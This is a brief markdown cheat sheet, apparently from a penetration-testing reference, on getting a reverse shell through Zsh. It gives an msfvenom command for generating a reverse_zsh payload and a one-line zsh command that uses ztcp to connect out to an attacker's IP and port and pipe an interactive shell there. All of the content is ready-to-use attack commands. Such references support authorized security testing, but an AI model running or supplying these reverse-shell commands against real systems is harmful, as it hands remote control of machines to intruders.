# Zsh

## 01 - Generate via `msfvenom`

```
$ msfvenom -p cmd/unix/reverse_zsh lhost=<IP> lport=<PORT>
```

## 02 - One-liners

```
$ zsh -c 'zmodload zsh/net/tcp && ztcp <attacker_IP> <attacker_PORT> && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
```